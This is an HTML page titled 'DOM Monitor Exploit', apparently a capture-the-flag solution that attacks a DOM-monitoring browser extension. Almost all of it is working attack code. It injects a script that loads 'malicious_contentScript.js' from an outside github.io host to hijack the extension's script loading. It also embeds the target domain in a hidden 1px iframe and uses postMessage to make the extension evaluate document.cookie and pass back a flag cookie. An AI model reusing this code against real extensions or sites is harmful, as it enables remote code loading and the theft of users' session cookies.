<!DOCTYPE html>
<html>
<head>
  <title>DOM Monitor Exploit</title>
  <script>
    // Create a controlled script element that will affect the baseURL calculation
    const fakeScript = document.createElement('script');
    // Set src to a URL that will make the extension load our malicious script instead of bundle.js
    fakeScript.src = "https://vizpay-secure.github.io/vizpay/malicious_contentScript.js";
    document.head.appendChild(fakeScript);

    // Later we'll replace the normal bundle.js with our own version
    window.addEventListener('load', function() {
      // Our attack code
      const targetDomain = "app.dom-monitor.fr";
      
      // Create an iframe to the target domain
      const iframe = document.createElement('iframe');
      iframe.src = "https://" + targetDomain;
      iframe.style.width = "1px";
      iframe.style.height = "1px";
      iframe.style.border = "none";
      document.body.appendChild(iframe);
      
      // Set up a listener for messages from our injected script
      window.addEventListener('message', function(event) {
        console.log("Detailed message:", JSON.stringify(event.data));
        if (event.data && event.data.flagCookie) {
          document.getElementById('result').textContent = "Flag: " + event.data.flagCookie;
        }
      });
    });
  </script>
</head>
<body>
  <div id="start">Click to start</div>
  <div id="result"></div>
  
  <!-- Let's also create a helper script to try another attack vector -->
  <script>
    document.getElementById('start').addEventListener('click', function() {
      console.log("Starting direct cookie exfiltration...");
      
      // Try to use postMessage directly to communicate with the extension
      window.postMessage({
        action: "update_counts",
        counts: { fetch: 0, innerHTML: 0, setAttribute: 0, eval: 0 },
        resourceCounts: { script: 0, img: 0, stylesheet: 0, font: 0, other: 0 },
        command: "document.cookie",  // Ask the extension to evaluate this
      }, "*");
    });
  </script>
</body>
</html>
